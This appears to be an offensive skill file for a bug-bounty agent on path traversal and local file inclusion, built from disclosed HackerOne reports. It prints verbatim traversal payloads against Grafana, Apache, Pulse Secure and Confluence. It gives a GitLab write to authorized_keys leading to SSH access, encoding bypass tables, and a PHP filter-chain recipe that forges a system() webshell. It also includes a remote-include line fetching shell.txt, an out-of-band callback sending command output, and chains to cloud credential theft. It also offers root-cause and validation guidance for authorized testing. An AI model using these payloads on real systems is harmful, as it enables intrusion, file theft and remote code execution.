# Find recent CVE fixes to test for incompleteness (the study pack's recurring theme)
git log --oneline --all --grep='CVE-\|traversal\|path' | head -40
```

### Verbatim payload excerpts from the highest-signal reports

These are taken from the study pack's TOP-list/highest-signal section — use them as templates when the matching surface is in scope.

```bash
# #1415820 — Grafana unauthenticated read (verbatim payload + observed output)
curl https://grafana-303ca6f8-<redacted>.aivencloud.com/public/plugins/mysql/\
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
# -> root:x:0:0:root:/root:/bin/bash / bin:x:1:1:bin:/bin:/sbin/nologin / ...

# #733072 — GitLab Maven registry write to authorized_keys
curl -H "Private-Token: $(cat token)" \
 http://10.26.0.5/api/v4/projects/2/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/\
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys \
 -XPUT --path-as-is --data-binary @/home/asakawa/.ssh/id_rsa.pub
# then: ssh git@10.26.0.5

# #1404731 — Apache 2.4.50 bypass payloads (verbatim)
# 1) %%32%65%%32%65   2) .%%32%65   3) .%%32e   4) .%2%65
GET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1
# RCE: POST /cgi-bin/%%32%65%%32%65/.../bin/sh

# #696276 — Pulse Secure CVE-2019-11510
curl -i -k --path-as-is \
 https://<host>/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/

# #232371 — Informatica double URL encode
http://doc.rt.informaticacloud.com/infocenter/ActiveVOS/v92/topic/com.activee.bpep.doc/images/\
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd

# #538771 — Confluence DIY macro preview (CVE-2019-3396)
POST /rest/tinymce/1/macro/preview HTTP/1.1
Content-Type: application/json
{"contentId":"12345","macro":{"name":"widget","body":"",
 "params":{"url":"https://www.youtube.com/watch?v=wHEHYJpCkpg","width":"300","height":"200","_template":"file://../"}}}

# #2778380 — Jolokia `!`-separated local file read
/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/crontab

# #719875 — LOAD DATA LOCAL INFILE exfiltration
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE asd.asd FIELDS TERMINATED BY "\n"

# #1639364 — download.php with a valid prefix before traversal
https://<host>.mil/download.php?filePathDownload=data_products/MISC/frida_cal/../../../../../../../../etc/passwd

# #1131465 — Ruby Tempfile on Windows (basename + ext)
Tempfile.open(["\\..\\..\\..\\..\\..\\Users\\rootx\\malicious", ".rb"])
# => C:/Users/rootx/AppData/Local/Temp\..\..\..\..\..\Users\rootx\malicious<rand>.rb

# #3465094 — curl file:// encoded traversal
file:///%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# #1377748 — Evernote attachment rename (2-click RCE)
# upload `libjnigraphics.so`, then rename to `../../../lib...` so open writes into the lib dir
```

### Detection / validation snippets
```bash
# Positive content match
curl -s <REQ> | grep -E 'root:x:0:0:|\[extensions\]|boot loader configuration'

# Negative control: non-existent sibling must NOT return content
curl -s <REQ-with-/etc/passwd_nope_RANDOM> | grep -q 'root:x' && echo "REFLECTION — investigate"

# Confirm a write escaped the sandbox
find / -name '<unique-canary>' 2>/dev/null

# Base64-encode a PHP read so truncated output still decodes
php://filter/convert.base64-encode/resource=/etc/passwd

# Host header / response-shape tell
# Content-Type flips to text/plain or octet-stream + a Last-Modified header on a dynamic route
```

---

## Common Root Causes

1. **User-controlled path concatenated into a filesystem call with no canonicalization** — `file_get_contents($docs_path . $page . '.md')` (#895972), `sendFile`, `path.join`, or a download `filePathDownload` parameter (#1639364). The feature is legitimate; the missing containment check is the bug. Without a canonicalize-then-verify-beneath-base check, any `..` wins.
2. **Client-side path normalization hides the attack from the developer** — `../` is stripped by the browser/curl, so testers who don't use `--path-as-is` miss it; servers that assume the input is already normalized are exposed (#696276, #695429). Firefox/IE sometimes failed to reproduce raw HTTP traversal findings (#333306).
3. **Decode-after-validate** — a filter removes `../` or checks the literal path, then the framework URL-decodes again (double-encode #232371, `%%32%65` #1404731, overlong UTF-8), re-forming traversal after the check. The number of decode passes is the bug.
4. **Archive extraction trusts member names** — ZIP entry names, tar symlinks, backup chunk paths, and tarball metadata are written straight to disk. `MY_RELATIVE_PATH` blocks absolute paths but not `../` (#3678395, #765291, #317321, #730239). Extraction tools should reject both.
5. **Metadata fields become filenames** — package name/version, `key`, `run_id`, or Content-Disposition filename are interpolated into a path without sanitization (#822262, #2334455, #2070212, #3408126). Securing only the "obvious" path field leaves the real sink open.
6. **Front-end/origin (or edge/origin) path disagreement** — proxy `ProxyPass`, app proxies, and matrix-param (`..;/`) handling where a segment is meaningful to one layer and ignored by another (#869888, #2817658, #1245165).
7. **Overly broad static/plugin file serving** — public plugin directories map URL paths directly to disk with no `..` containment (#1415820, #1427086) or expose arbitrary directory listings (#307666).
8. **Incomplete CVE patches** — fixes that cover the common case (regular paths, one encoding, one transformer) but miss UNC paths (#3255707), `.svn`/`.bzr` (#4037976), the Vips transformer (#3553340), Buffer-based paths (#2434811, #2225660), or one decode layer (#1400238). Always retest the patched variant.
9. **Powerful-but-unguarded protocol sinks** — `file://`, `netdoc:`, `LOAD DATA LOCAL INFILE`, JMX file-write commands exposed over HTTP, and libcurl wildcard/local-file handling are enabled by default in some contexts (#538771, #719875, #2778380, #3973143).
10. **Silent acceptance of encoded separators** — treating `%2f`, `%2e`, and `%00` as inert data while a downstream layer decodes them into path syntax (the recurring theme across #232371, #333306, #3465094, #3973143).

---

## Bypass Techniques

### Encoding & normalization bypasses
| Filter / defense | Bypass |
|------------------|--------|
| Literal `../` stripped once | `....//`, `..././`, mixed `..\/` |
| URL-decode once | `%2e%2e%2f`, `%2f` for `/` |
| Decode twice | `%252e%252e%252f`, `..%252f` (#232371) |
| Apache 2.4.50 patch | `%%32%65`, `.%%32%65`, `.%2%65` (#1404731) |
| Dot/slash allowlist on literal chars | overlong UTF-8 `%c0%ae%c0%ae%2f` |
| Windows path checks | `..\..\`, `..%5c`, device names + UNC `\\server\share` (#3255707) |
| `path.normalize` / device-name fix | UNC variant of `CON:../../` (#3255707) |
| Extension appended (`$x . '.md'`) | truncation `?`/`#`, null byte on legacy PHP (#895972) |

### Proxy / parser-confusion bypasses
- **Matrix params / semicolon**: `..;/` survives directory restrictions in AJP/ProxyPass setups (#2817658); Orange Tsai's path-normalization research is cited in that report.
- **App proxy prefix escape**: `/apps/ss/b.php/../../` to break out of a fixed upstream path (#869888).
- **Path-as-is**: prevent the client from collapsing `..` before the request is sent (#696276, #695429).
- **Client-side relative path**: `%2F..%2F..%2F` concatenated into an asset URL (#1245165).
- **Double URL-encode on static routes**: `/static/..%252f...` decoded once by a CDN/edge and again by the origin (#333306).

### Archive & symlink bypasses
- Zip Slip entry name with a long `../` prefix (#205481, #765291, #316713).
- Symlink entries pointing at `/etc/passwd` or a directory to be deleted (#317321, #730239).
- Incomplete metadata-dir blacklists: if `.git`/`.hg` are excluded, try `.svn`/`.bzr` (#4037976).
- Retrying a "fixed" extractor with the alternate entry type (regular file vs symlink) often re-opens the sink.

### Metadata / field-position bypasses
- Put traversal in the *version* field when the *name* field is checked (#822262).
- Put traversal in `run_id`, `key`, or a Content-Disposition `filename` when the main path is checked (#2070212, #2334455, #3408126).
- Use an absolute path when the app does not prepend a base, or a valid prefix + `../` when it does (#1639364).
- For CMS attachment renames, put `../../../` in the new filename rather than the upload path (#1377748).

### When the response hides the result (blind read)
- Flip `Content-Type` to text/plain / octet-stream and inspect `Last-Modified` as a positive tell (#333306, #229622).
- Base64-encode the read (`php://filter/convert.base64-encode/resource=`) so even truncated output decodes.
- Calibrate required depth from verbose error messages that leak the extraction/destination path (#316713).
- Use timing/content-length deltas only as a secondary signal — confirm with real bytes and a negative control before reporting.

---

## Gate 0 Validation

Before writing the report, confirm all three. Path traversal is unusually prone to false positives because apps happily echo paths and emit canned errors.

1. **What can the attacker DO right now?**
   - Show **real file contents**: a literal `root:x:0:0:` line, real PHP source after decoding, or the actual `win.ini` sections.
   - For a write: show the file landed at a path *outside* the intended directory (unique canary), and whether that path is executable/trusted.
   - For a blind case: show a stable content/length/content-type delta plus a negative control. "The path was accepted" is not proof.
   - For a named CVE: prove reachability of the specific vulnerable route, not just the version banner.

2. **What does the victim LOSE?**
   - Quantify the blast radius: a config read exposing DB creds/API keys/private keys; a write to `authorized_keys`/cron/webroot = RCE; source disclosure revealing more sinks; deletion of a critical file = DoS.
   - A non-sensitive file read with no chain is Medium at most. An RCE-grade write or secret-bearing read is Critical/High. The reports here span Low (#254269) to Critical (#291878, #1394916) — let reachability set the score.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Is the endpoint live and the parameter still present?
   - Does the content match repeat reliably (not a one-off cache/WAF artifact)?
   - Can a second person follow the exact steps — including `--path-as-is` / encoding quirks / the right HTTP client — and get the same bytes?

### Minimum evidence block to include in the report
```
Endpoint + parameter:
Exact raw request (with --path-as-is / encoding noted):
Response showing REAL file content (fingerprint line):
Negative control (non-existent sibling -> no content):
For writes: canary path outside the intended directory:
Reachability / blast radius (what the file or write unlocks):
Reproduction prerequisites (auth level, client, CVE version):
```

### Severity map (use reachability, not the `../` itself)

| Primitive / reach | Severity | Corpus example |
|-------------------|----------|----------------|
| Non-sensitive file read, no chain | Low–Medium | #895972 limited LFI; #254269 Low |
| Read of config/creds/source (`.env`, `wp-config.php`, keys) | High | #1415820, #719875 |
| Unauthenticated appliance/config read at scale | High–Critical | #696276, #936399, #1394916 |
| Arbitrary file WRITE to an executable/trusted path | Critical (RCE) | #733072, #519220, #1102067 |
| Archive symlink escape → overwrite/delete outside sandbox | High–Critical | #765291, #317321 |
| Incomplete patch of a known traversal CVE | High | #3255707, #4037976, #1400238 |
| Client-side traversal → CSS injection → PII exfil | Medium | #1245165 |
| Blind/partial read with no content proof | Do not report | retract per Gate 0 |

**Retract these non-findings:** an echoed path in an error string; a lone 403/500 that appears for any `../`; a "different-looking" page that is actually a WAF block; a `Content-Length` delta with no negative control; a write that only lands inside the allowed upload directory; a read of a file that is already publicly served. Partial reads that cannot be escalated (#895972) should be reported honestly as limited/low, not inflated to RCE.

---

## Real Impact Examples

### Scenario A — Package-registry traversal → SSH key write → RCE (GitLab #733072 / #822262 pattern)
A GitLab Maven package registry API accepted a URL-encoded artifact path. By encoding `../` as `%2e%2e%2f` and using `--path-as-is`, the attacker wrote a file to an arbitrary location writable by the `git` user. The chosen destination was `~/.ssh/authorized_keys`, seeded with the attacker's public key; `ssh git@HOST` then yielded a shell (the author noted binding the container's Docker IP when port 22 was not exposed). The companion NuGet report (#822262) achieved the same write class via a `<version>../../../../../nyangawa</version>` field combined with a Gitaly race. This is the canonical Critical traversal-to-RCE chain in the corpus ($12,000 each).

### Scenario B — Unauthenticated plugin-route read → full filesystem disclosure (Grafana #1415820 / Apache #1394916 pattern)
A hosted Grafana instance served static plugin files from `/public/plugins/<plugin>/`. The route mapped URL segments directly to disk with no containment, so `/public/plugins/mysql/..%2F..%2F..%2F..%2Fetc%2Fpasswd` returned the real `root:x:0:0:` file to an unauthenticated user. The Apache CVE-2021-41773/42013 reports (#1394916, #1404731) show the same shape at the server layer: a path-normalization flaw mapped URLs outside Alias directories, and with CGI enabled the traversal became RCE by POSTing to `/bin/sh`. Impact ranges from config/secret theft to full host compromise depending on file readability and CGI state.

### Scenario C — Archive symlink/Zip-Slip escape → overwrite outside the sandbox (Nextcloud #765291 / RubyGems #317321 pattern)
An "Extract here" feature accepted a user ZIP and did not validate member names or symlinks. A crafted archive member with a `../../` path overwrote `apps/files/App.php` in the Nextcloud install, turning the download into code execution (#765291). The RubyGems case (#317321) used a `tmp -> /tmp` symlink plus `tmp/dir` to delete an arbitrary directory via `FileUtils.rm_rf` after the safety check. These matter because there is no `?file=` parameter — the sink is the upload/extraction primitive itself.

### Scenario D — Client-side path traversal → CSS injection → PII exfiltration (Acronis #1245165)
A frontend concatenated the `color_scheme` GET parameter into a CSS asset URL. Because `.` and `/` were not sanitized, `?color_scheme=%2F..%2F..%2FPARAMETER` caused a request for `/PARAMETER.css`, a relative-path overwrite. Chained with an open redirect, this became CSS injection capable of exfiltrating personal data — demonstrating that traversal-class findings are not limited to server-side file reads.

### Scenario E — Pre-auth appliance read at scale (Cisco ASA/FTD & Pulse Secure pattern)
Multiple DoD reports (#936399, #959187, #695429, #696276) found unauthenticated file read across many hosts by fingerprinting appliances and applying public CVE payloads. Cisco's `/+CSCOT+/translation-table?...&lang=../` leaked `portal_inc.lua` source; `/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions` disclosed VPN sessions; Pulse Secure's `dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd` returned the host passwd file. The lesson: once a CVE is public, systematically enumerate in-scope instances — many reports are "I discovered previously unidentified instance" (#695429, #694865, #694861).

---

## Disclosed Report Citations

All IDs below are real and appear in the 256-report study pack. Every entry names the company, title, subclass/technique, and year/bounty as recorded there.

1. **GitLab — Path traversal, to RCE** ([H1 #733072](https://hackerone.com/reports/733072)) — arbitrary file write to `~/.ssh/authorized_keys` via Maven registry path traversal → RCE, 2019 — **$12,000**.
   - Technique: URL-encoded `%2e%2e%2f` path with `--path-as-is` in a PUT to the package API.
2. **GitLab — Path traversal in Nuget Package Registry** ([H1 #822262](https://hackerone.com/reports/822262)) — `<version>` field traversal + Gitaly race → arbitrary write, 2020 — **$12,000**.
   - Root cause: `"#{package_name.downcase}.#{package_version.downcase}.nupkg"` interpolation in `metadata_extraction_service.rb`.
3. **Nextcloud — Remote code execution via path traversal in Zip extraction in the Extract app** ([H1 #765291](https://hackerone.com/reports/765291)) — Zip Slip overwrite of `App.php` → RCE, 2019 — CVSS 8.8.
   - The malicious request body path traversed out of the extraction directory to overwrite an app file.
4. **WordPress — RCE as Admin defeats WordPress hardening and file permissions** ([H1 #436928](https://hackerone.com/reports/436928)) — upload dir/path traversal → file include → RCE, 2018 — Critical.
   - Abused `wp_mkdir_p`/`_wp_upload_dir` permission behavior; "including it, I was able to execute arbitrary code."
5. **WordPress — Wordpress unzip_file path traversal** ([H1 #205481](https://hackerone.com/reports/205481)) — zip extraction `../` entry → PHP file in DocumentRoot, 2017 — CVSS 6.6.
   - A filename beginning with `../` extracts outside the `$to` target directory.
6. **WordPress — Arbitrary file deletion in wp-core guides towards RCE and information disclosure** ([H1 #291878](https://hackerone.com/reports/291878)) — `thumb` metadata → `unlink` path traversal, 2017 — CVSS 9.9.
   - `$newmeta['thumb']` stored unsanitized, then `str_replace`/`unlink` in `wp_delete_attachment`.
7. **Aiven Ltd — Zero day path traversal in Grafana 8.x allows unauthenticated arbitrary local file read** ([H1 #1415820](https://hackerone.com/reports/1415820)) — `/public/plugins/mysql/..%2F...` unauthenticated read, 2021 — $1,000 / CVSS 7.5.
   - Payload returns real `root:x:0:0:` lines from `/etc/passwd`.
8. **MariaDB — Grafana LFI on grafana.mariadb.org** ([H1 #1419213](https://hackerone.com/reports/1419213)) — `/public/plugins/alertlist/` deep `../` chain → `/etc/passwd`, 2021 — Medium.
   - Long run of literal `../` segments in the URL path.
9. **MTN Group — Path traversal vulnerability in Grafana 8.x allows local file read** ([H1 #1427086](https://hackerone.com/reports/1427086)) — unauthenticated `/public/plugins/mysql/` traversal, 2021 — Critical.
   - Same Grafana class as #1415820 against an MTN-hosted IP.
10. **Internet Bug Bounty — Path traversal and file disclosure in Apache HTTP Server 2.4.49** ([H1 #1394916](https://hackerone.com/reports/1394916)) — CVE-2021-41773 path normalization, 2021 — $4,000.
    - Path-normalization change let URLs map to files outside Alias-like directives; RCE with mod_cgi.
11. **Internet Bug Bounty — Path Traversal and RCE in Apache 2.4.49/2.4.50 (CVE-2021-42013)** ([H1 #1400238](https://hackerone.com/reports/1400238)) — incomplete CVE-2021-41773 fix, 2021 — $1,000.
    - Reported internally with Apache before the patch; only affects 2.4.49/2.4.50.
12. **Internet Bug Bounty — Path Traversal and RCE in Apache HTTP Server 2.4.50** ([H1 #1404731](https://hackerone.com/reports/1404731)) — `%%32%65` encoding bypass → CGI RCE, 2021 — $1,000.
    - Payloads `%%32%65%%32%65`, `.%%32%65`, `.%%32e`, `.%2%65`; POST to `/bin/sh`.
13. **Ruby on Rails — File writing by Directory traversal at actionpack-page_caching and RCE** ([H1 #519220](https://hackerone.com/reports/519220)) — encoded `/` in cache URL → ERB page write → RCE, 2019 — $1,000.
    - `curl ".../books/1%2f%2e%2e%2f.../README%2emd"` wrote cache outside the intended dir.
14. **Ruby on Rails — Path traversal in ActiveStorage leading RCE** ([H1 #2334455](https://hackerone.com/reports/2334455)) — `key` traversal in Disk service → file write/RCE, 2024 — CVSS 8.1.
    - Requires knowing `secret_key_base`; forges a signed key with `../` to write `<% system('date') %>`.
15. **U.S. Dept Of Defense — Arbitrary File Reading leads to RCE in Pulse Secure SSL VPN** ([H1 #696276](https://hackerone.com/reports/696276)) — CVE-2019-11510 pre-auth read via `dana-na/.../guacamole/`, 2019 — CVSS 8.6.
    - Chains to Orange Tsai's DEVCORE CVE set (11539 command injection, 11508 file write).
16. **U.S. Dept Of Defense — Unauthenticated LFI using the symbol `!`** ([H1 #2778380](https://hackerone.com/reports/2778380)) — Jolokia `compilerDirectivesAdd/!/etc!/passwd`, 2024 — High.
    - `!` acts as a directory separator in the JMX command path; also read `/etc/crontab`.
17. **U.S. Dept Of Defense — Local File Inclusion in download.php** ([H1 #1639364](https://hackerone.com/reports/1639364)) — `filePathDownload` prefix + `../` chain, 2022 — Medium.
    - Only worked with a valid externally-facing directory before the traversal.
18. **Informatica — Arbitrary File Reading via Double URL Encode** ([H1 #232371](https://hackerone.com/reports/232371)) — `..%252f` double-encoded path, 2017 — High.
    - `/infocenter/.../images/..%252f...%252fetc/passwd` returned the full passwd file.
19. **Ubiquiti Inc. — [dev-nightly.ubnt.com] Local File Reading** ([H1 #260420](https://hackerone.com/reports/260420)) — `..\..\..\etc\passwd` backslash traversal, 2017 — High.
    - Plain `GET /..\..\..\..\etc\passwd` read files outside the web root.
20. **Ubiquiti Inc. — Directory traversal at nightly.ubnt.com** ([H1 #229622](https://hackerone.com/reports/229622)) — Express static route file read, 2017 — CVSS 7.5.
    - Found with Acunetix/IronWasp HTTP request functions; `X-Powered-By: Express`.
21. **Shopify — Path Traversal in App Proxy** ([H1 #869888](https://hackerone.com/reports/869888)) — `/apps/ss/b.php/../../` upstream path escape, 2020 — CVSS 6.8.
    - Shopify didn't escape `../`, letting an anonymous user reach unintended upstream paths.
22. **Semrush — Ad Builder Display Ads Path Traversal** ([H1 #316713](https://hackerone.com/reports/316713)) — zip extraction + `data.csv` image path traversal, 2018 — Medium.
    - Destination path was recovered from error messages observed during testing.
23. **Infogram — LFI through the MySQL connection** ([H1 #719875](https://hackerone.com/reports/719875)) — `LOAD DATA LOCAL INFILE '/etc/passwd'` to attacker MySQL, 2019 — High.
    - Set the SQL SELECT value to `LOAD DATA LOCAL INFILE`, pointed the app at an attacker MySQL server, captured the file.
24. **Algolia — Directory traversal at msg.algolia.com** ([H1 #333306](https://hackerone.com/reports/333306)) — `/static/..%252f...%252fetc/passwd`, 2018 — Medium.
    - Double-encoded traversal; response `Content-Type: text/plain` confirmed raw file read.
25. **Concrete CMS — Authenticated path traversal to RCE** ([H1 #1102067](https://hackerone.com/reports/1102067)) — `bFilename` + PHP-in-PNG upload via design dialog, 2021 — CVSS 8.0.
    - PNG with `<?php system("uname -a");?>` appended, included through `ccm/system/dialogs/block/design/submit`.
26. **Node.js — Windows Device Names Still Allow Path Traversal in UNC Paths After CVE-2025-27210 Fix** ([H1 #3255707](https://hackerone.com/reports/3255707)) — `path.join` UNC + device-name bypass, 2025 — CVSS 7.5.
    - Regular paths fixed, but `path.join('\\\\server\\share\\uploads', 'CON:../../secret.txt')` still traversed.
27. **curl — Path Traversal Bypass in file:// URLs Due to Incomplete URL-Encoded Path Normalization** ([H1 #3465094](https://hackerone.com/reports/3465094)) — `dedotdotify()` misses `%2f`, 2025 — High.
    - `file:///%2f%2e%2e%2f...` survives `dedotdotify()` then decodes to `/../../etc/passwd` before open.
28. **curl — FTP wildcard matching decodes server-provided filenames enabling directory traversal** ([H1 #3973143](https://hackerone.com/reports/3973143)) — `%2e%2e%2f` in LIST filename, 2025 — High.
    - `curl_maprintf("%s%s", wildcard->path, finfo->filename)` then URL-decode enables escape.
29. **Evernote — 2 click Remote Code execution in Evernote Android** ([H1 #1377748](https://hackerone.com/reports/1377748)) — attachment rename `../../../` traversal → native lib overwrite, 2021 — High.
    - Renamed `libjnigraphics.so` to `../../../lib...`, written into the app's lib dir on open.
30. **Ruby — Path traversal in Tempfile on Windows due to unsanitized backslashes** ([H1 #1131465](https://hackerone.com/reports/1131465)) — `basename`/`ext` backslash traversal → arbitrary file create, 2021 — $500.
    - `Tempfile.open(["\\..\\..\\..\\malicious", ".rb"])` created a file outside the temp dir.

---

## Related Skills & Chains

- **`hunt-lfi`** — overlapping class; use it for PHP-specific escalation (`php://filter` filter-chain RCE, log/session poisoning, `phar://`, `data://`, RFI) once a read primitive is confirmed here.
- **`xxe-injection`** — file-read via `file://` entities overlaps with traversal sinks; pivot a confirmed read into blind OOB exfil (parameter entities / DTD) when the response is not reflected, and test XInclude when DTD is disabled.
- **`hunt-rce`** — a traversal WRITE into `authorized_keys`, cron, a webroot script, or an app cache is the handoff point for RCE validation and impact scoring; verify with a benign command only.
- **`hunt-ssrf`** — path traversal into `file://` handlers and SSRF share parser/protocol surfaces; a URL-fetching sink that accepts `file://` can yield both classes.
- **`hunt-file-upload`** — archive/avatar/attachment filename traversal and Zip Slip live at the upload boundary; pair the two skills for extraction-based writes and symlink escapes.
- **`hunt-cloud-misconfig`** — use a confirmed arbitrary read to pull `~/.aws/credentials`, `~/.docker/config.json`, and `/run/secrets/*`, then hand off to cloud-credential abuse chains.
- **`triage-validation`** — apply the Gate 0 discipline here: require real file contents or a landed canary, plus a negative control, before submitting; echoed paths and lone status-code diffs are retracted.

### Chain recipes grounded in the corpus
- **Traversal write → key-based RCE**: arbitrary write → `~/.ssh/authorized_keys` → SSH login (#733072). Validate the write with a canary first, then a benign command.
- **Traversal write → template/cache RCE**: cache-key traversal → ERB/PHP inserted into a served page → execute on next request (#519220, #1102067).
- **Archive escape → app-file overwrite**: Zip Slip → overwrite framework source → code execution on next request (#765291, #205481).
- **Read → secret → cloud pivot**: arbitrary read → `~/.aws/credentials` or `/proc/self/environ` → authenticated cloud API abuse (`hunt-cloud-misconfig`, `cloud-iam-deep`).
- **Read → source → new sink**: disclose `web.xml` / `config.php` / `.git/config` → find additional paths and hardcoded credentials → re-enter the hunt with a richer map.
- **Client-side traversal → CSS injection → exfil**: relative-path overwrite in an asset URL → CSS injection → PII exfiltration with an open redirect (#1245165).
- **Incomplete patch → variant bounty**: retest the sibling surface the fix missed (UNC vs. regular path, `.bzr` vs. `.git`, Vips vs. ImageMagick) for a fresh report (#3255707, #4037976, #3553340).


---

## Merged Source Knowledge

This section consolidates **31 unique knowledge blocks** from 1 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (43 unique sections). No source section appears in more than one hunt skill.


### From `hunt-skills/hunt-lfi/SKILL.md`

## Crown Jewel Targets

LFI that reaches code execution is Critical. Pure file-read is High when it exposes secrets (`.env`, `wp-config.php`, private keys, cloud creds), Medium when it only reads non-sensitive files.

**Highest-value chains (in rough order of reliability in 2026):**
- **PHP filter-chain → RCE** — the modern default. A bare `php://filter` *file-read* primitive is upgraded to RCE with **no upload endpoint and no writable file** by chaining `iconv` conversions to forge an arbitrary PHP payload in-memory (Synacktiv, 2022). See the dedicated section below. This is the single most impactful thing to try and the most-missed.
- **Log poisoning → RCE** — inject PHP into an Apache/Nginx log (User-Agent / URL path), then include the log. Increasingly blocked by `open_basedir` and unreadable log perms, so verify the log is *readable* first.
- **PHP wrappers → source disclosure** — `php://filter/convert.base64-encode/resource=index.php` leaks source; read source to find more LFI sinks, secrets, and the include base path.
- **RFI → RCE** — when `allow_url_include=On`, `?file=http://OOB/shell.txt` pulls and executes remote code. Rare on modern configs but trivially Critical when present.
- **phar:// deserialization** — a crafted PHAR + any unserialize-on-metadata sink → object-injection RCE.
- **zip:// / data:// chains** and **session/upload poisoning** when filters block wrappers.

---

## OOB / Blind-LFI Confirmation Gate (Read First)

LFI is frequently **blind**: the included content is parsed/executed but never reflected, or the page swallows the file into a template you can't see. Do **not** claim LFI from indirect signals alone.

### What is NOT confirmation
- A different status code or error string for `../../etc/passwd` vs a normal value. The app may be string-matching `../` and returning a canned 403/500 without ever touching the filesystem.
- Your input **echoed back** inside an error message (e.g. `failed to open '/var/www/../../etc/passwd'`). That is the path *formatter*, not proof the file was read. A genuine read shows file **contents**, not your path.
- A page that "looks different." Reflected-input or WAF block pages produce diffs unrelated to a real read.

### What IS confirmation
- **Direct read:** actual file *contents* appear (real `root:x:0:0:` line, real PHP source after base64-decoding the filter output).
- **Blind read via OOB exfil:** use a php://filter or XXE-style chain whose payload performs a DNS/HTTP callback to your **Burp Collaborator** subdomain, or use an `expect://` / wrapper that triggers an outbound request. A unique-per-sink Collaborator hit (DNS + HTTP, with the server's source IP) proves the include ran.
- **Blind read via differential/timing:** include a file you *know* exists and is large (`/etc/passwd`) vs one that does not (`/etc/passwd_nope_<rand>`). Stable, repeatable response-length or latency delta = real filesystem access. Confirm with a third known-good path to rule out coincidence.

### Default workflow
1. Pick a **unique marker** target: prefer a file whose content you can fingerprint exactly (`/etc/passwd` → grep `^root:`). For blind, use a php://filter base64 read and decode — partial/truncated base64 still decodes to recognizable source.
2. Generate a sub-tagged Collaborator payload per sink (`lfi-page.<collab>`, `lfi-tpl.<collab>`) so callbacks identify which parameter fired.
3. Send, wait 30–120s, poll OOB.
4. Claim LFI **only** after a content match, a Collaborator callback, or a stable triple-confirmed timing/length delta. Echoed paths and lone status-code changes are retracted.

---

### URL / Body Parameters
```
?page=  ?file=  ?path=  ?template=  ?view=  ?lang=  ?module=
?include=  ?doc=  ?load=  ?read=  ?content=  ?theme=  ?layout=
?component=  ?download=  ?img=  ?pdf=  ?report=  ?style=  ?dir=
JSON bodies: {"filename":...} {"template":...} {"path":...}
```

### Technology Stack Signals
| Signal | Vector |
|--------|--------|
| PHP (`X-Powered-By`, `.php`, PHPSESSID) | php:// filter-chain RCE, phar://, zip://, data:// |
| Apache/Nginx logs readable | Log poisoning → RCE (verify readability first) |
| Apache 2.4.49 / 2.4.50 (`Server:` banner) | CVE-2021-41773 / CVE-2021-42013 traversal → RCE |
| PHP-CGI on Windows (XAMPP, `php-cgi.exe`) | CVE-2024-4577 arg-injection → RCE |
| Java servlet (`/WEB-INF/`) | `WEB-INF/web.xml`, `classes/`, `application.properties` |
| Python Flask/Django | `/proc/self/environ`, `settings.py`, `SECRET_KEY` |
| Node.js file-serve / `res.sendFile`, `express.static` | path-traversal read, `require()` traversal |
| Windows IIS / .NET | `..\..\web.config`, `C:\Windows\win.ini`, machineKey |

---

### Phase 1 — Identify Candidates
```bash
cat recon/$TARGET/urls.txt | gf lfi > recon/$TARGET/lfi-candidates.txt
grep -E "(\?|&)(page|file|path|template|view|lang|module|include|doc|load|read|content|download|img|pdf|report|dir)=" \
  recon/$TARGET/urls.txt
ffuf -u "https://$TARGET/FUZZ" -w ~/wordlists/lfi-paths.txt -mc 200,301,302
```

### Phase 2 — Path Traversal (read)
```bash
?file=../../../etc/passwd
?file=....//....//....//etc/passwd            # ../ stripping once → ....// survives
?file=..%2f..%2f..%2fetc%2fpasswd             # single URL-encode
?file=..%252f..%252f..%252fetc%252fpasswd     # double encode (decoded twice server-side)
?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd          # encode dots too
?file=/etc/passwd%00.png                      # null byte — PHP < 5.3.4 only
?file=....\/....\/etc\/passwd                  # mixed slash

# Prefix-forced base (app prepends /var/www/): pad with extra ../, or absolute path if no prefix

# Windows
?file=..\..\..\windows\win.ini
?file=..%5c..%5c..%5cwindows%5cwin.ini
?file=C:\inetpub\wwwroot\web.config
```

### Phase 3 — PHP Wrappers (source disclosure)
```bash
?file=php://filter/convert.base64-encode/resource=index.php   # decode base64 → source
?file=php://filter/read=string.rot13/resource=config.php
?file=php://filter/convert.base64-encode/resource=../app/Config.php

### Phase 4 — PHP Filter-Chain → RCE (no upload, no writable file)
The modern flagship technique (Synacktiv, 2022). If you have a `php://`-capable LFI that *reads* a file, you can also *execute* attacker-chosen PHP. `iconv` charset conversions, chained inside `php://filter`, emit controlled bytes that prepend to the resource until a full `<?php ... ?>` payload is forged — then `include()` runs it. **No upload endpoint, no log access, no writable path required.**

```bash

#   git clone https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'

# Drop it into the sink:
?file=php://filter/convert.iconv.UTF8.CSISO2022KR|...<long-chain>...|convert.base64-decode/resource=php://temp&c=id
```
Notes / gotchas:
- Requires the include sink to accept the `php://filter` scheme (most LFI sinks calling `include`/`require`/`file_get_contents` on the param do).
- Payloads get **long** (10–50KB). If the param is length-capped or WAF-blocked on size, move it to a POST body, or use a minimal payload (`<?=`shorthand`?>`).
- For blind targets, set the chain payload to a Collaborator callback (`<?php file_get_contents("http://x.<collab>/".`id`);?>`) to confirm execution OOB.
